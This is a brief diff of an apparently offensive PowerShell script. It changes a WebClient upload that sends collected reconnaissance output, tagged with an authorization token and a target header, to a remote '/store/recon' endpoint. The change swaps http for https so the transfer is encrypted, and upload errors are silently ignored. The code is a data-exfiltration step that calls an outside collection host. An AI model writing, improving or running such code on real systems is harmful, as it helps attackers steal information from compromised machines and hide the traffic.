@@ -151,4 +151,4 @@ $wc = New-Object Net.WebClient
 $wc.Headers.Add("Authorization", $AU)
 $wc.Headers.Add("Content-Type", "text/plain")
 $wc.Headers.Add("X-Target", $TH)
-try { $wc.UploadString("http://${H}:${P}/store/recon", $out.ToString()) } catch {}
+try { $wc.UploadString("https://${H}:${P}/store/recon", $out.ToString()) } catch {}
